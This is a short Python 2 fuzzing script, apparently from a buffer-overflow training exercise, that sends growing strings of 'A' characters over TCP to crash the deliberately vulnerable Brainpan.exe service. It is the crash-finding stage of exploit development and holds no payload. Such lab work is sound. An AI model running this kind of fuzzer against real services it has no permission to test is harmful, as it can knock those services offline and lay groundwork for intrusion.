#!/usr/bin/python
import time
import struct
import sys
import socket as so

#Buff represents an array of buffers.
#This will begin at 100, and increment by 100..
#Will continue untill it reaches 4000, or until Brainpan.exe crashes.

buff=["A"]

#Maximum size of buffer.
max_buffer = 4000

#Initial counter value.
counter = 100

#Value to increment per attempt.
increment = 100

#While the buffer length is less than or equal to 4000..
while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s 192.168.1.10 9999" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash brainpan.exe at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)  #Create a socket object, using IPv4 TCP 
     try: #Connect to the server and port & send data.
        s.connect((server,port))
        s.send(string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed. Make sure IP/port are correct, or check debugger for brainpan.exe crash."
        sys.exit()

